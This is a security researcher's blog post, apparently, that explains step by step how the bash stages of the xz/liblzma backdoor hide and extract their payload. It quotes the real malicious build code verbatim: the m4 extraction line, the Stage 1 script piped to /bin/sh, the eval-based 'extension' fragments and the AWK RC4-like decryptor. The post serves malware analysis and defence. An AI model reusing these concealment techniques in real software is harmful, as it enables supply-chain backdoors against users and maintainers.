<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>xz/liblzma: Bash-stage Obfuscation Explained - gynvael.coldwind//vx.log</title>
<meta property="og:title" content="xz/liblzma: Bash-stage Obfuscation Explained" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link type="text/css" href="/style.css" rel="stylesheet"/>
<link type="text/css" href="/inpost.css" rel="stylesheet"/>
<link rel="shortcut icon" href="https://gynvael.coldwind.pl/fav.ico"/>
<link rel="alternate" type="application/rss+xml" href="rss_pl.php" title="gynvael.coldwind//vx.log (PL)" />
<link rel="alternate" type="application/rss+xml" href="rss_en.php" title="gynvael.coldwind//vx.log (EN)" />
<!--<meta name="viewport" content="width=device-width, initial-scale=1">-->
<meta property="og:image" content="https://gynvael.coldwind.pl/img/gynvael_logo.png" />
<style>
#consulting {
  display: block;
  width: fit-content;
  font-size: 0.8em;
  text-align: center;
  background-color: #2c2c5c;
  color: #a7a7ea;
  padding: 0.7em;
  padding-left: 1em;
  padding-right: 1em;
  clip-path: polygon(
    0 10px,
    10px 0,
    100% 0, 
    100% calc(100% - 10px), 
    calc(100% - 10px) 100%, 
    0 100%, 
    0 10px
 );
  text-decoration: none;
}
#consulting:hover {
  color: #2c2c5c;
  background-color: #a7a7ea;
}

@media (min-width: 1120px) {
  #consulting {
    display: block;
  }
}


#training {
  display: block;
  width: fit-content;
  font-size: 0.8em;
  text-align: center;
  background-color: #2c2c5c;
  color: #a7a7ea;
  padding: 0.7em;
  padding-left: 1em;
  padding-right: 1em;
  clip-path: polygon(
    0 10px,
    10px 0,
    100% 0, 
    100% calc(100% - 10px), 
    calc(100% - 10px) 100%, 
    0 100%, 
    0 10px
 );
  text-decoration: none;
  color: #a7a7ea;
}
#training:hover {
  background-color: #a7a7ea;
  color: #2c2c5c;
}

@media (min-width: 1120px) {
  #training {
    display: block;
  }
}

.top-button-container {
  position: absolute;
  left: 220px;
  top: 120px;
  width: 484px;
  display: flex;
  justify-content: space-evenly;
  align-items: center;

}

</style>
</head>
<body>
<div id="main">
<div id="header" style="position: relative;">
  <h1 id="logo"><a href="/?blog=1"><img src="/img/logo.gif" alt="gynvael.coldwin//vx.log"/></a></h1><img src="/images/something_suspicious.png" style="margin: -34px 74px 0px 0px; padding: 0px;" align="right" alt="" />
  <div class="top-button-container">
  <a id="consulting" href="https://hexarcana.ch/?utm=gyn-blog">Available for Consulting and Projects</a>
  <a id="training" href="https://hexarcana.ch/workshops/?utm=gyn-blog-w">Upcoming Talks</a>
  </div>
</div>

<div id="sidebar"><div class="section"><img src='/img/gynvael-close.jpg' style='margin-left:0.5em' /><br /><ul><li><a href="/">Return to dashboard <big>&#8682;</big></a></li></ul><br /><h3><em>Sections</em></h3>
<ul>
  <li><b>lang</b>: <a href="?blog=1&amp;lang=pl"><img src="/images/lang_pl.png" style="margin: 0" alt="PL" /></a> | <a href="?blog=1&amp;lang=en"><img src="/images/lang_en.png" style="margin: 0" alt="EN" /></a></li>
  <li><b>RSS</b>: <a href="/rss_pl.php"><img src="/images/lang_pl.png" style="margin: 0" alt="RSS PL" /></a> | <a href="/rss_en.php"><img src="/images/lang_en.png" style="margin: 0" alt="RSS EN" /></a></li>
	<li><br /></li>
<li><a href='?id=50'>About me</a></li>
<li><a href='?id=182'>Tools</a></li>
<li><br /></li>
<li><a href='https://youtube.com/c/GynvaelEN'>&rarr; <span style='background-color:#e62218;color:white;font-weight:bold;padding-left:0.25em;padding-right:0.25em'>YT</span> YouTube (EN)</a></li>
<li><a href='/discord'>&rarr; <span style='background-color:#7087d8;color:white;font-weight:bold;padding-left:0.25em;padding-right:0.25em'>D</span> Discord</a>
<li><a href='https://infosec.exchange/@gynvael'>&rarr; <span style='background-color:#6b65d8;color:white;font-weight:bold;padding-left:0.25em;padding-right:0.25em'>M</span> Mastodon</a>
<li><a href='https://twitter.com/gynvael'>&rarr; <span style='background-color:#009def;color:white;font-weight:bold;padding-left:0.25em;padding-right:0.25em'>T</span> Twitter</a>
<li><a href='https://github.com/gynvael'>&rarr; <span style='background-color:#282d31;color:white;font-weight:bold;padding-left:0.25em;padding-right:0.25em'>GH</span> GitHub</a>
<br />

  <br />
  <div style='font-size: 0.8em; line-height:1; text-align: center; width: 160px'>
  <a href='https://hexarcana.ch'><img src='/img/hexarcana160_2.png' style='margin-left: 0;' /></a>
    <br />
    <a href='https://hexarcana.ch'>My company's website</a>
  </div>







  <br />
  <div style='font-size: 0.8em; line-height:1; text-align: center; width: 160px'>
    <a href='https://pagedout.institute/'><img src='/img/po_issue_5_rbanner.png' style='margin-left: 0;' /></a>
    <br />
    <a href='https://pagedout.institute/'>Paged Out! zine</a>
  </div>


  <br />
  <div style='font-size: 0.8em; line-height:1; text-align: center; width: 160px'>
    <a href='https://dragonsector.pl/'><img src='/img/ds_logo_160.jpg' style='margin-left: 0;' /></a>
    <br />
    <a href='https://dragonsector.pl/'>Dragon Sector CTF Team</a>
  </div>

</ul></div>

		<div class="section"><h3><em>Links / Blogs</em></h3>
	
        <ul>
        <li><a href="http://dragonsector.pl"><big>&rarr;</big> dragonsector.pl</a></li>
        <li><a href="http://vexillium.org"><big>&rarr;</big> vexillium.org</a></li>
      
          <!--<li><a href="http://arashicoldwind.blogspot.com/"><big>&rarr;</big> arashi coldwind blogspot</a></li>-->

          <li><small><b>Security/Hacking:</b></small><ul>
          <li><a href="http://j00ru.vexillium.org/?lang=en">j00ru's blog</a></li>
          <li><a href="http://lcamtuf.blogspot.com/">lcamtuf's blog</a></li>
          <li><a href="http://blog.invisiblethings.org/">invisible things (new)</a></li>
          <li><a href="http://theinvisiblethings.blogspot.com/">invisible things (old)</a></li>
          <li><a href="http://liveoverflow.com/">liveoverflow's site</a></li>
          <li><a href="https://d3vnull.com/">/dev/null's site</a></li>
          <li><a href="http://blog.pi3.com.pl/">pi3's blog</a></li>
          <li><a href="http://icewall.pl/">icewall's blog</a></li>
          <li><a href="http://blog.cmpxchg8b.com/">taviso's blog</a></li>          
          <li><a href="http://wampir.mroczna-zaloga.org/">pawel's blog</a></li>
          <li><a href="http://www.sandeepkamble.com/">sandeep's blog</a></li>
          <li><a href="http://blog.kotowicz.net/">koto's blog</a></li>
          <li><a href="http://128nops.blogspot.ch/">carstein's blog</a></li>
          <li><a href="http://zaufanatrzeciastrona.pl/">zaufana trzecia strona</a></li>
          <li><a href="https://niebezpiecznik.pl/">niebezpiecznik</a></li>
          <li><a href="https://sekurak.pl/">sekurak</a></li>

</ul></li>

          <li><small><b>Reverse Eng./Low-Level:</b></small><ul>
          <li><a href="http://blog.rewolf.pl/blog/">rewolf's blog</a></li>
          <li><a href="http://gdtr.wordpress.com/">gdtr</a></li>
          <li><a href="http://omeg.pl/">spinning mirrors</a></li>
          <li><a href="https://www.secnews.pl/">security news</a></li>
          <li><a href="http://rev3rsed.blogspot.com/">rev3rsed</a></li> <!-- last post: 24.11.2015 -->
</ul></li>

          <li><small><b>Programming/Code:</b></small><ul>
          <li><a href="https://dev.krzaq.cc/">/dev/krzaq</a></li>
          <li><a href="http://sil2100.vexillium.org/">sil2100/vx's web log</a></li>
          <li><a href="http://asawicki.info/">adam sawicki</a></li>
          <li><a href="http://devkk.net/">devkk.net</a></li>
          <li><a href="http://xion.org.pl/">xion.log</a></li>
</ul></li>
                </div>

<div class="section"><h3><em><a href="?">Posts</a></em></h3>
<ul>
<li><small><a href="?id=797"><span class="val">Paged Out! #5 is out</span>,</a></small></li>
<li><small><a href="?id=796"><span class="val">CVEs of SSH talk this Thursday</span>,</a></small></li>
<li><small><a href="?id=793"><span class="val">Debug Log: Internet doesn't work (it was the PSU)</span>,</a></small></li>
<li><small><a href="?id=791"><span class="val">FAQ: The tragedy of low-level exploitation</span>,</a></small></li>
<li><small><a href="?id=789"><span class="val">Solving Hx8 Teaser 2 highlight videos!</span>,</a></small></li>
<li><small><a href="?id=788"><span class="val">Gynvael on SECURITYbreak podcast</span>,</a></small></li>
<li><small><a href="?id=786"><span class="val">Paged Out! #4 is out</span>,</a></small></li>
<li><small><a href="?id=785"><span class="val">I won't be able to attend CONFidence'24 after all :(</span>,</a></small></li>
<li><small><a href="?id=782"><span class="val">xz/liblzma: Bash-stage Obfuscation Explained</span>,</a></small></li>
<li><small><a href="?id=781"><span class="val">Two of my bookmarklets: image extraction and simple TTS</span>,</a></small></li>
<li><a href="/">&rarr; see all posts on main page</a></li>

	<li><br /></li>

      </ul></div>
	
	
	<div id="footer">
          // copyright &copy; Gynvael Coldwind<br/>
          // design &amp; art by Xa<br/>
          // logo font (birdman regular) by utopiafonts / Dale Harris<br/>
        <br/>
        /* the author and owner of this blog hereby allows anyone to test the security of this blog (on HTTP level only, the server is not mine, so let's leave it alone ;&gt;), and try to break in (including successful breaks) without any consequences of any kind (DoS attacks are an exception here) ... I'll add that I planted in some places funny photos of some kittens, there are 7 of them right now, so have fun looking for them ;&gt; let me know if You find them all, I'll add some congratz message or sth ;&gt; */
        <br/><br/>
        <b>Vulns found in blog:</b><br/>
        * XSS <i>(pers, user-inter)</i> by ged_<br/>
        * XSS <i>(non-pers)</i> by Anno &amp; Tracerout<br/>
        * XSS <i>(pers)</i> by Anno &amp; Tracerout<br/>
        * Blind SQLI by Sławomir Błażek<br/>
        * XSS <i>(pers) by </i>Sławomir Błażek<br/>
      </div>
</div><div id="content">
        <div class="title"><div class="inside"><div class="inside2"><div class="date">2024-03-30: </div><h2><a href="?id=782">xz/liblzma: Bash-stage Obfuscation Explained</a></h2><div class="tags">xz:liblzma</div></div></div></div>
        <div class="post"><div class="htmlpost"><p>Yesterday <a href="https://www.openwall.com/lists/oss-security/2024/03/29/4">Andres Freund emailed oss-security@</a> informing the community of the discovery of a backdoor in xz/liblzma, which affected OpenSSH server (huge respect for noticing and investigating this). Andres' email is an amazing summary of the whole drama, so I'll skip that. While admittedly most juicy and interesting part is the obfuscated binary with the backdoor, the part that caught my attention – and what this blogpost is about – is the initial part in bash and the simple-but-clever obfuscation methods used there. Note that this isn't a full description of what the bash stages do, but rather a write down of how each stage is obfuscated and extracted.</p>

<p>P.S. Check the comments under this post, there are some good remarks there.</p>

<h2>Before we begin</h2>
<p>We have to start with a few notes.</p>

<p>First of all, there are two versions of xz/liblzma affected: 5.6.0 and 5.6.1. Differences between them are minor, but do exist. I'll try to cover both of these.</p>

<p>Secondly, the bash part is split into three (four?) stages of interest, which I have named Stage 0 (that's the start code added in <span class="code">m4/build-to-host.m4</span>) to Stage 2. I'll touch on the potential "Stage 3" as well, though I don't think it has fully materialized yet.</p>

<p>Please also note that the obfuscated/encrypted stages and later binary backdoor are hidden in two test files: <span class="code">tests/files/bad-3-corrupt_lzma2.xz</span> and <span class="code">tests/files/good-large_compressed.lzma</span>.</p>


<a name="stage0"></a>
<h2><a href="#stage0">Stage 0</a></h2>
<p>As pointed out by Andres, things start in the <a href="https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63"><span class="code">m4/build-to-host.m4</span></a> file. Here are the relevant pieces of code:</p>

<code>...
gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'
...
gl_path_map='tr "\t \-_" " \t_\-"'
...
</code>

<p>This code, which I believe is run somewhere during the build process, extracts Stage 1 script. Here's an overview:</p>

<ol>
  <li>Bytes from <span class="code">tests/files/bad-3-corrupt_lzma2.xz</span> are read from the file and outputted to standard output / input of the next step – this chaining of steps is pretty typical throughout the whole process. After everything is read a newline (<span class="code">\n</span>) is added as well.<br><br></li>

  <li>The second step is to run <span class="code">tr</span> (translate, as in "map characters to other characters", or "substitute characters to target characters"), which basically changes selected characters (or byte values) to other characters (other byte values). Let's work through a few features and examples, as this will be imporant later.<br><br>

  The most basic use looks like this:
  <code>echo "BASH" | tr "ABCD" "1234"
21SH</code>
  What happend here is "A" being mapped to (translated to) "1", "B" to "2", and so on.<br><br>

  Instead of characters we can also specify ranges of characters. In our initial example we would just change "ABCD" to "A-D", and do the same with the target character set: "1-4":
  <code>echo "BASH" | tr "A-D" "1-4"
21SH</code>
  <br>

  Similarly, instead of specyfing characters, we can specify their ASCII codes... in octal. So "A-D" could be changed to "\101-\104", and "1-4" could become "\061-\064".
  <code>echo "BASH" | tr "\101-\104" "\061-\064"
21SH</code>
  <br>

  This can also be mixed - e.g. "ABCD1-9\111-\115" would create a set of A, B, C, D, then numbers from 1 to 9, and then letters I (octal code 111), J, K, L, M (octal code 115). This is true both for the input characters set and the target character set.<br><br>

  Going back to the code, we have <span class="code">tr "\t \-_" " \t_\-"</span>, which does the following substitution in bytes streamed from the <span class="code">tests/files/bad-3-corrupt_lzma2.xz</span> file:

    <ul>
      <li>0x09 (<span class="code">\t</span>) are replaced with 0x20,</li>
      <li>0x20 (whitespace) are replaced with 0x09,</li>
      <li>0x2d (<span class="code">-</span>) are replaced with 0x5f,</li>
      <li>0x5f (<span class="code">_</span>) are replaced with 0x2d,</li>
    </ul>

  This actually "uncorrupts" the <span class="code">bad-3-corrupt_lzma2.xz</span>, which forms a proper xz stream again.<br><br></li>

  <li>In the last step of this stage the fixed xz byte stream is extracted with errors being ignored (the stream seems to be truncated, but that doesn't matter as the whole meaningful output has already been written out). The outcome of this is the Stage 1 script, which is promptly executed.</li>
</ol>



<a name="stage1"></a>
<h2><a href="#stage1">Stage 1</a></h2>
<p>In Andres' email that's the bash file starting with "####Hello####", which is pretty short, so let's present it here with differences between 5.6.0 and 5.6.1 <span style="background-color: black">marked with black background</span>.</p>

<code>####Hello####
<span style="background-color: black"># <i>a few binary bytes here, but as it's a comment they are ignorred</i></span>
<span style="background-color: black">[ ! $(uname) = "Linux" ] &amp;&amp; exit 0
[ ! $(uname) = "Linux" ] &amp;&amp; exit 0
[ ! $(uname) = "Linux" ] &amp;&amp; exit 0
[ ! $(uname) = "Linux" ] &amp;&amp; exit 0
[ ! $(uname) = "Linux" ] &amp;&amp; exit 0</span>
eval `grep ^srcdir= config.status`
if test -f ../../config.status;then
eval `grep ^srcdir= ../../config.status`
srcdir="../../$srcdir"
fi
export i="((head -c +1024 >/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 >/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 >/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 >/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 >/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 >/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 >/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 >/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 >/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 >/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 >/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 >/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 >/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 >/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 >/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 >/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 >/dev/null) &amp;&amp; head -c <span style="background-color: black">+939</span>)";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c <span style="background-color: black">+31233</span>|tr <span style="background-color: black">"\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113"</span> "\0-\377")|xz -F raw --lzma1 -dc|/bin/sh
####World####
</code>

<p>The first difference are the random bytes in the comment on the second line.</p>

<ul>
  <li>In version 5.6.0 it's <span class="code">86 F9 5A F7 2E 68 6A BC</span>,</li>
  <li>and in 5.6.1 that's <span class="code">E5 55 89 B7 24 04 D8 17</span>.</li>
</ul>

<p>I'm not sure if these differences are meaningful in any way, but wanted to note it.</p>

<p>The check whether the script is running on Linux was added in 5.6.1, and the fact that it's repeated 5 times makes this pretty funny – was someone like "oops, forgot this last time and it cause issues, better put it in 5 times as an atonement!"?</p>

<p>We'll get back to the remaining differences later, but for now let's switch to Stage 2 extraction code, which is that huge <span class="code">export i=...</span> line with a lot of heads. As previously, let's go step by step:</p>

<ol>
  <li>The <span class="code">export i=...</span> at the beginning is basically just a function "definition". It's being invoked in step 3 (as well as in Stage 2), so we'll get to it in a sec (also, it's simpler than it looks).<br><br></li>

  <li>The first actual step in the extraction process of Stage 2 is the decompression (<span class="code">xz -dc</span>) of the <span class="code">good-large_compressed.lzma</span> file to standard output. This, as previously, starts a chain of outputs of one step being used as inputs in the next one.<br><br></li>

  <li>Now we get to the <span class="code">i</span> function invocation (<span class="code">eval $i</span>). This function is basically a chain of <span class="code">head</span> calls that either output the next N bytes, or skip (ignore) the next N bytes.<br><br>

  At the very beginning we have this:
  <code>(head -c +1024 >/dev/null)</code>
  The <span class="code">-c +1024</span> option there tells head to read and output only the next 1024 bytes from the incoming data stream (note that the + there is ignored, it doesn't do anything, unlike in <span class="code">tail</span>). However, since the output is redirected in this case to <span class="code">/dev/null</span>, what we effectively get is "skip the next 1024 bytes".<br><br>

  This is a good moment to note, that if we look at the first 1024 bytes in the uncompressed data stream from the <span class="code">good-large_compressed.lzma</span> file, it's basically the "A" character (byte 0x41) repeated 1024 times. To add a bit of foreshadowing, after the first 1024 characters there is some binary data.<br><br>

  The next <span class="code">head</span> call looks almost identical, with a different length:
  <code>head -c +2048</code>
  Note that in this case output is not ignored – it will actually be passed to the next step as input.<br><br>

  And this pattern repeats: 1024 bytes are ignored, than 2048 bytes are outputted, 1024 bytes ignored, 2048 outputted... and so on until we get to the very end of the file where only 724 bytes (in 5.6.0) or 939 bytes (in 5.6.1) are outputted.<br><br>

  To visualize this, here's the actual input data that's processed by this set of <span class="code">head</span> calls. Byte 0 is on top-left of the file; each column represents 256 bytes of the file as grayscale. Note the "empty gray" regions between the high entropy ("noisy") areas – what this part of the script does is basically just removing the empty regions and merging the regions with actual data together.

  <style>
    .flex-container {
      display: flex;
      width: 100%;
      padding: 1em 0;
      align-items: center;
    }
    .flex-item-middle {
      display: flex;
      align-items: center;
      padding: 0 0.5em;
      font-size: 3em;
    }
  </style>

  <div class="flex-container">
    <div><img src="img/good-large_compressed.data.png" alt=""></div>
    <div class="flex-item-middle">→</div>
    <div><img src="img/stage1_carved.data.png" alt=""></div>
  </div>
  </li>

  <li>In the next step – <span class="code">tail -c +31233</span> – the initial portion of the data is discarded (spoiler: it hides the binary backdoor, which is extracted in the next Stage, so it's not needed now). In 5.6.0 that would be the first 3126<u>4</u> bytes and in the 5.6.1 that's 3123<u>2</u> (the one-off difference is because of <span class="code">tail -c +N</span> means "start outputting from byte N" and not "ignore first N bytes").<br><br></li>

  <li>Step 5 revisits the <span class="code">tr</span> command, which in this case is used as a very simple substitution cipher, with key (byte value mapping) being different in 5.6.0 and 5.6.1:

    <code>5.6.0: tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377"
5.6.1: tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377"</code>

  As per previous explanation, this basically means that (for 5.6.0) byte of value 5 will be substitute with byte of value 0, byte of value 6 will be substituted with byte of value 1, and so on. In each case there are 6 ranges which map to the whole 0 - 255 (that's 377 octal) range.<br><br></li>

  <li>In the last step the deciphered data is decompressed (<span class="code">xz -F raw --lzma1 -dc</span>) and the resulting Stage 2 is promptly executed.</li>
</ol>

<a name="stage2"></a>
<h2><a href="#stage2">Stage 2</a></h2>
<p>Stage 2 is the <a href="https://www.openwall.com/lists/oss-security/2024/03/29/4/1">infected.txt</a> file attached by Andres in the original email (that's the 5.6.0 version btw). There's a lot going on in this bash script, as this is where the actual compilation process modification happens.</p>

<p>From the perspective of obfuscation analysis, there are three interesting fragments to this script, <b>two of which appear only in the 5.6.1 version</b>. Let's start with them, as they are also simpler.</p>


<a name="stage2-ext"></a>
<h3><a href="#stage2-ext">Stage 2 "extension" mechanism</a></h3>

<p>Fragment 1:</p>
<code>vs=`grep -broaF '~!:_ W' $srcdir/tests/files/ 2>/dev/null`
if test "x$vs" != "x" > /dev/null 2>&amp;1;then
f1=`echo $vs | cut -d: -f1`
if test "x$f1" != "x" > /dev/null 2>&amp;1;then
start=`expr $(echo $vs | cut -d: -f2) + 7`
ve=`grep -broaF '|_!{ -' $srcdir/tests/files/ 2>/dev/null`
if test "x$ve" != "x" > /dev/null 2>&amp;1;then
f2=`echo $ve | cut -d: -f1`
if test "x$f2" != "x" > /dev/null 2>&amp;1;then
[ ! "x$f2" = "x$f1" ] &amp;&amp; exit 0
[ ! -f $f1 ] &amp;&amp; exit 0
end=`expr $(echo $ve | cut -d: -f2) - $start`
eval `cat $f1 | tail -c +${start} | head -c +${end} | tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" | xz -F raw --lzma2 -dc`
fi
fi
fi
fi</code>

<p>Fragment 3:</p>
<code>vs=`grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null`
if test "x$vs" != "x" > /dev/null 2>&amp;1;then
f1=`echo $vs | cut -d: -f1`
if test "x$f1" != "x" > /dev/null 2>&amp;1;then
start=`expr $(echo $vs | cut -d: -f2) + 7`
ve=`grep -broaF '%.R.1Z' $top_srcdir/tests/files/ 2>/dev/null`
if test "x$ve" != "x" > /dev/null 2>&amp;1;then
f2=`echo $ve | cut -d: -f1`
if test "x$f2" != "x" > /dev/null 2>&amp;1;then
[ ! "x$f2" = "x$f1" ] &amp;&amp; exit 0
[ ! -f $f1 ] &amp;&amp; exit 0
end=`expr $(echo $ve | cut -d: -f2) - $start`
eval `cat $f1 | tail -c +${start} | head -c +${end} | tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" | xz -F raw --lzma2 -dc`
fi
fi
fi
fi</code>

<p>These two fragments are pretty much identical, so let's handle both of them at the same time. Here's what they do:</p>

<ol>
  <li>First of all they try to find (<span class="code">grep -broaF</span>) two files in <span class="code">tests/files/</span> directory which contain the following bytes (signature):
  <code>Fragment 1: "~!:_ W" and "|_!{ -"
Fragment 3: "jV!.^%" and "%.R.1Z"</code>
  Note that what's actually outputted by <span class="code">grep</span> in this case has the following format: <span class="code">file_name:offset:signature</span>. For example:
  <code>$ grep -broaF "XYZ"
testfile:9:XYZ</code><br>
  </li>

  <li>If such file is found, the offset for each file is extracted (<span class="code">cut -d: -f2</span>, which takes the 2nd field assuming : is the field delimiter), and the first offset + 7 is saved as <span class="code">$start</span>, and the second offset from the second file is saved as <span class="code">$end</span>.<br><br></li>

  <li>Once the script has the <span class="code">$start</span> and <span class="code">$end</span> offsets, it carves out that part of the file-that-had-the-first-signature:
    <code>cat $f1 | tail -c +${start} | head -c +${end}</code><br></li>

  <li>And what follows is first the substitution cipher (using the 5.6.0 version key from Stage 1 btw):
    <code>tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377"</code><br>
  </li>

  <li>and then decompressing the data for it to be promptly executed:
    <code>eval `... | xz -F raw --lzma2 -dc`</code>
  </li>

</ol>

<p>Note that in neither of the investigated TAR archives (5.6.0 and 5.6.1) there were any files with any of the signatures. This whole thing basically looks like an "extension/patching" system that would allow adding future scripts to be run in the context of Stage 2, without having to modify the original payload-carrying test files. Which makes sense, as modyfing a "bad" and "good" test files over and over again is pretty suspicious. So the plan seemed to be to just add new test files instead, which would have been picked up, deciphered, and executed.</p>

<a name="stage2-backdoor"></a>
<h3><a href="#stage2-backdoor">Stage 2 backdoor extraction</a></h3>

<p>As pointed out by Andres in the original e-mail, at some point an .o file is extracted and weaved into the compilation/linking process. The following code is responsible for that (again, differences between versions are <span style="background-color: black">marked with black background</span>):</p>

<code>N=0
W=<span style="background-color: black">88664</span>
else
N=<span style="background-color: black">88664</span>
W=0
fi
xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed &quot;s/\(.\)/\1\n/g&quot; | LC_ALL=C awk 'BEGIN{FS=&quot;\n&quot;;RS=&quot;\n&quot;;ORS=&quot;&quot;;m=256;for(i=0;i&lt;m;i++){t[sprintf(&quot;x%c&quot;,i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l&lt;<span style="background-color: black">8192</span>;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t[&quot;x&quot; (NF&lt;1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf &quot;%c&quot;,(v+k)%m}' | xz -dc --single-stream | ((head -c +$N &gt; /dev/null 2&gt;&amp;1) &amp;&amp; head -c +$W) &gt; liblzma_la-crc64-fast.o || true</code>

<p>The differences between versions boil down to the size of the compressed-but-somewhat-mangled payload – that's 88792 in 5.6.0 and 88664 in 5.6.1 – and one value change in the AWK script, to which we'll get in a second.</p>

<p>As in all previous cases, the extraction process is a chain of commands, where the output of one command is the input of the next one. Furthermore, actually some steps are identical as in Stage 1 (which makes sense, since – as I've mentioned – they binary payload resides in the previously ignored part of the "good" file data). Let's take a look:</p>

<ol>
  <li>The first step is identical as step 2 in Stage 1 – the <span class="code">tests/files/good-large_compressed.lzma</span> file is being extracted with xz.<br><br></li>

  <li>Second step is in turn identical as step 3 in Stage 1 – that was the "a lot of heads" "function" invocation.<br><br></li>

  <li>And here is where things diverge. First of all, the previous output get's mangled with the <span class="code">sed</span> command:
    <code>LC_ALL=C sed &quot;s/\(.\)/\1\n/g&quot;</code>
  What this does, is actually putting a newline character after each byte (with the exception of the new line character itself). So what we end up with on the output, is a byte-per-line situation (yes, there is a lot of mixing "text" and "binary" approaches to files in here). This is actually needed by the next step.<br><br></li>

  <li>The next step is an AWK script (that's a simple scripting language for text processing) which does – as mak pointed out for me – <a href="https://en.wikipedia.org/wiki/RC4">RC4...ish</a> decription of the input stream. Here's a prettyfied version of that script:
    <code>BEGIN {  # Initialization part.
  FS = &quot;\n&quot;;  # Some AWK settings.
  RS = &quot;\n&quot;;
  ORS = &quot;&quot;;
  m = 256;
  for(i=0;i&lt;m;i++) {
    t[sprintf(&quot;x%key&quot;, i)] = i;
    key[i] = ((i * 7) + 5) % m;  # Creating the cipher key.
  }
  i=0;  # Skipping 4096 first bytes of the output PRNG stream.
  j=0;  # ↑ it's a typical RC4 thing to do.
  for(l = 0; l &lt; 4096; l++) {  # 5.6.1 uses 8192 instead.
    i = (i + 1) % m;
    a = key[i];
    j = (j + a) % m;
    key[i] = key[j];
    key[j] = a;
  }
}

{  # Decription part.
  # Getting the next byte.
  v = t[&quot;x&quot; (NF &lt; 1 ? RS : $1)];

  # Iterating the RC4 PRNG.
  i = (i + 1) % m;
  a = key[i];
  j = (j + a) % m;
  b = key[j];
  key[i] = b;
  key[j] = a;
  k = key[(a + b) % m];

  # As pointed out by <a href="https://twitter.com/nugxperience/status/1773906926503591970">@nugxperience</a>, RC4 originally XORs the encrypted byte
  # with the key, but here for some add is used instead (might be an AWK thing).
  printf &quot;%key&quot;, (v + k) % m
}</code><br></li>

  <li>After the input has been decrypted, it gets decompressed:
    <code>xz -dc --single-stream</code><br></li>

    <li>And then bytes from N (0) to W (~86KB) are being carved out using the same usual <span class="code">head</span> tricks, and saved as <span class="code">liblzma_la-crc64-fast.o</span> – which is the final binary backdoor.
      <code>((head -c +$N &gt; /dev/null 2&gt;&amp;1) &amp;&amp; head -c +$W) &gt; liblzma_la-crc64-fast.o</code>
    </li>



</ol>

<h2>Summary</h2>
<p>Someone put a lot of effort for this to be pretty innocent looking and decently hidden. From binary test files used to store payload, to file carving, substitution ciphers, and an RC4 variant implemented in AWK all done with just standard command line tools. And all this in 3 stages of execution, and with an "extension" system to future-proof things and not have to change the binary test files again. I can't help but wonder (as I'm sure is the rest of our security community) – if this was found by accident, how many things still remain undiscovered.</p>
</div>
        <div class="postcomments"></div>
        </div>
<div id="comments"><h2>Comments:</h2>

<div class="comment zebra0"><div class="commentdata">2024-03-30 20:18:29 = <a href="http://">xeb</a></div>
{<div class="text">Can&#039;t wait for writeup of the analysis of the binary part... :)</div>}
</div>
<div class="comment zebra1"><div class="commentdata">2024-03-30 20:31:25 = <a href="http://">Fox</a></div>
{<div class="text">I appreciate such a clean write-up, your style doesn&#039;t beat around the bush and is probably the best analysis that gets right to the point that I find most interesting. I will bookmark this site!</div>}
</div>
<div class="comment zebra0"><div class="commentdata">2024-03-30 20:34:54 = <a href="http://">Rhialto</a></div>
{<div class="text">Here are some notes I made, It&#039;s not written up as nicely as yours but there are some details that you could fill in in your version.<br/><br/>https://pastebin.com/5gnnL2yT</div>}
</div>
<div class="comment zebra1"><div class="commentdata">2024-03-30 20:42:58 = <a href="http://">youdabest</a></div>
{<div class="text">gynvael- would love to watch an english live stream reveresing session on the payload.  miss your youtube content tremendously!</div>}
</div>
<div class="comment zebra0"><div class="commentdata">2024-03-30 20:54:53 = <a href="http://">Wolf480pl</a></div>
{<div class="text">I was wondering about the test file&#039;s interleaved low-entropy and high-entropy areas.<br/>Do you think it was in order to make it look more believable as a test file, eg. to seem like it was checking if xz will correctly detect which parts are compressible and which should be left uncompressed?</div>}
</div>
<div class="comment zebra1"><div class="commentdata">2024-03-30 20:56:06 = <a href="http://sedcore.eu.org">sed</a></div>
